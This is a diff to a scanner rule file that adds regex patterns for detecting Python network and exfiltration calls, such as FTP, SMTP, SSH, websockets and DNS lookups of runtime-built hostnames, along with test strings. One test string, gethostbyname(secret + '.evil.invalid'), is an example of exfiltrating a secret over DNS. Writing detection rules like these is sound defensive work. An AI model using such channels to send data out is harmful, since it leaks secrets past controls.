@@ -195,11 +195,29 @@ rules:
         - '\bhttpx\s*\.\s*(?:get|post|put|patch|request|Client)\s*\('
         - '\bsocket\s*\.\s*(?:socket|create_connection)\s*\('
         - '\bhttp\s*\.\s*client\s*\.\s*HTTP(?:S)?Connection\s*\('
+        # Additions. Every allow-list of method names is a list the attacker
+        # reads too, and these were the holes: a real download primitive, the
+        # async clients, and the non-HTTP channels that carry data just as well.
+        - '\burlretrieve\s{0,4}\('
+        - '\baiohttp\s{0,4}\.\s{0,4}(?:ClientSession|request|get|post)\s{0,4}\('
+        - '\bwebsockets\s{0,4}\.\s{0,4}connect\s{0,4}\('
+        - '\bftplib\s{0,4}\.\s{0,4}FTP(?:_TLS)?\s{0,4}\('
+        - '\bsmtplib\s{0,4}\.\s{0,4}SMTP(?:_SSL)?\s{0,4}\('
+        - '\bparamiko\s{0,4}\.\s{0,4}(?:SSHClient|Transport)\s{0,4}\('
+        # DNS resolution with a hostname built at runtime. A name is a channel:
+        # the label is the payload and the query leaves the network whether or
+        # not anything answers, which is why exfiltration uses it when HTTP is
+        # blocked.
+        - '\bsocket\s{0,4}\.\s{0,4}(?:gethostbyname|getaddrinfo)\s{0,4}\(\s{0,4}[^)\n]{0,120}\+'
+        - '\bdns\s{0,4}\.\s{0,4}resolver\s{0,4}\.'
     tests:
       positive:
         - "requests.post(url, data=payload)"
         - "urllib.request.urlopen(target)"
         - "sock = socket.create_connection((host, port))"
+        - "urllib.request.urlretrieve(url, '/tmp/x')"
+        - "socket.gethostbyname(secret + '.evil.invalid')"
+        - "smtplib.SMTP('mail.example.invalid')"
       negative:
         - "response = cache.get(key)"
         - "# requests are proxied through the gateway"
